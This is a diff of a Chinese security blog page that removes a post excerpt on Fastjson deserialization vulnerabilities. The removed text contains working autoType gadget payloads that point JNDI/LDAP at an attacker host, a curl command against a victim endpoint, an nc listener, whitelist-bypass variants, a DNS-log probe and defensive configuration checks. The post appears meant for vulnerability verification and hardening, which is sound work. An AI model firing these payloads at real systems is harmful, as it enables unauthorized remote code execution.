class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="方案-3：Tomcat-JDBC-池利用"><a href="#方案-3：Tomcat-JDBC-池利用" class="headerlink" title="方案 3：Tomcat JDBC 池利用"></a>方案 3：Tomcat JDBC 池利用</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.jdbc.pool.DataSourceFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;jndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Exploit&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="漏洞验证步骤"><a href="#漏洞验证步骤" class="headerlink" title="漏洞验证步骤"></a>漏洞验证步骤</h3><h4 id="1-启动-HTTP-监控"><a href="#1-启动-HTTP-监控" class="headerlink" title="1. 启动 HTTP 监控"></a>1. 启动 HTTP 监控</h4><p>在 <code>192.168.1.12</code> 执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python 3 (记录完整请求)</span></span><br><span class="line"><span class="comment"># linux</span></span><br><span class="line">python3 -m http.server 8000 2&gt;&amp;1 | <span class="built_in">tee</span> http.log</span><br><span class="line"></span><br><span class="line"><span class="comment">#windows</span></span><br><span class="line"><span class="comment">#powershell</span></span><br><span class="line">python -m http.server 8000 2&gt;&amp;1 | Tee-Object -FilePath http.log</span><br><span class="line"></span><br><span class="line"><span class="comment">#cmd.exe</span></span><br><span class="line">python -m http.server 8000 &gt; http.log 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用 netcat</span></span><br><span class="line">nc -lvnp 8000</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-发送恶意请求"><a href="#2-发送恶意请求" class="headerlink" title="2. 发送恶意请求"></a>2. 发送恶意请求</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://VICTIM_IP:PORT/vuln-endpoint \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span></span><br><span class="line"><span class="string">    &quot;dataSourceName&quot;: &quot;ldap://192.168.1.12:8000/FastjsonPoc&quot;,</span></span><br><span class="line"><span class="string">    &quot;autoCommit&quot;: true</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="3-验证成功标志"><a href="#3-验证成功标志" class="headerlink" title="3. 验证成功标志"></a>3. 验证成功标志</h4><p>在 HTTP 服务器查看访问日志：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /FastjsonPoc - 来自目标 IP 的请求</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="白名单绕过技巧"><a href="#白名单绕过技巧" class="headerlink" title="白名单绕过技巧"></a>白名单绕过技巧</h3><p>若目标配置了白名单，尝试这些变体：</p>
-<h4 id="1-类名混淆"><a href="#1-类名混淆" class="headerlink" title="1. 类名混淆"></a>1. 类名混淆</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Bypass1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="2-嵌套白名单类"><a href="#2-嵌套白名单类" class="headerlink" title="2. 嵌套白名单类"></a>2. 嵌套白名单类</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;beanFactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;shareableResources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;ldap://192.168.1.12:8000/Bypass2&quot;</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="3-MyBatis-别名利用"><a href="#3-MyBatis-别名利用" class="headerlink" title="3. MyBatis 别名利用"></a>3. MyBatis 别名利用</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ibatis.type.Alias&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Bypass3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="防护检测建议"><a href="#防护检测建议" class="headerlink" title="防护检测建议"></a>防护检测建议</h3><ol>
-<li><p><strong>检查 AutoType 状态</strong>：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回 true 表示危险</span></span><br><span class="line">ParserConfig.getGlobalInstance().isAutoTypeSupport();</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>列出所有白名单</strong>：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().getAcceptList()</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>安全配置示例</strong>：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 最佳安全实践</span></span><br><span class="line">ParserConfig.getGlobalInstance().setSafeMode(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></li>
-</ol>
-<hr>
-<h2 id="结果分析矩阵"><a href="#结果分析矩阵" class="headerlink" title="结果分析矩阵"></a>结果分析矩阵</h2><table>
-<thead>
-<tr>
-<th align="left">观察现象</th>
-<th align="left">漏洞可能性</th>
-<th align="left">建议行动</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">HTTP 服务器收到 GET 请求</td>
-<td align="left">✅ 确认存在</td>
-<td align="left">立即修复</td>
-</tr>
-<tr>
-<td align="left">返回 <code>Class not found</code> 错误</td>
-<td align="left">⚠️ 可能存在</td>
-<td align="left">尝试其他 gadget 类</td>
-</tr>
-<tr>
-<td align="left">返回 <code>autoType not support</code> 错误</td>
-<td align="left">🛡️ 可能已防护</td>
-<td align="left">检查安全配置</td>
-</tr>
-<tr>
-<td align="left">连接超时</td>
-<td align="left">不确定</td>
-<td align="left">检查网络策略&#x2F;防火墙</td>
-</tr>
-<tr>
-<td align="left">持续抛出 <code>HttpMessageNotReadable</code></td>
-<td align="left">⚠️ 高可能性</td>
-<td align="left">分析完整异常栈</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p> 即使未观察到直接请求，<code>HttpMessageNotReadableException</code> 异常本身可能已表明 payload 触发了非预期行为，建议结合日志深度分析。</p>
-<p><strong>注意：</strong></p>
-<p>如下是进行dnslog，即便collaborator有反应也不能说明存在RCE，只能说明存在dns解析</p>
-</blockquote>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxxxxxxxcollaboratorxxxxxxxxxx.com&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/07/09/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
